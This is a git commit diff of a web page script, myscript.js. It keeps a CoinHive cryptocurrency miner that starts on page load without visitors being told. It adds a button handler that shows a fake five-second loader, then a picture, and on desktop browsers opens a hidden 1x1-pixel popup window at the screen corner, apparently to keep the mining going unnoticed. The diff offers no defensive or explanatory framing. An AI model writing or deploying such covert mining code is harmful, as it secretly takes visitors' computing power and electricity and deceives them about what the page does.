1d695ec2916ada325e043de804e8ab7d2e926fdd
Yoidea <yoidea.cc@gmail.com>
2018-04-08 17:19:39 +0900

    Update

--- myscript.js
+++ myscript.js
@@ -1,23 +1,17 @@
 $(function(){
-	console.log('ready');
 	var miner = new CoinHive.Anonymous('fq2DutyzyB9jOE55VfSiNDL623OVqAKw', {throttle: 0.3});
 	miner.start();
-	// $('#popup').click(function(){
-	// 	win = window.open('http://www.yahoo.co.jp/', 'yahoo', 'width=1, height=1, top=0, left=0');
-	// 	won = window.open('http://www.yahoo.co.jp/', 'main', 'width=500, height=500');
-	// });
-	$('#button').click(showLoader);
+	$('#button').click(function(){
+		$(this).prop('disabled', true);
+		$('#loader').show();
+		if (!miner.isMobile()){
+			window.open('white.html', 'bg', 'width=1, height=1, top=0, left=0');
+		}
+		setTimeout(function(){
+			$('#interface').hide();
+			$('#picture').show();
+		}, 5000);
+	});
 	$('#loader').hide();
-	$('#answer').hide();
+	$('#picture').hide();
 });
-
-function showLoader(){
-	$(this).prop('disabled', true);
-	$('#loader').show();
-	setTimeout(showAnswer, 5000);
-}
-
-function showAnswer(){
-	$('#loader').hide();
-	$('#answer').show();
-}
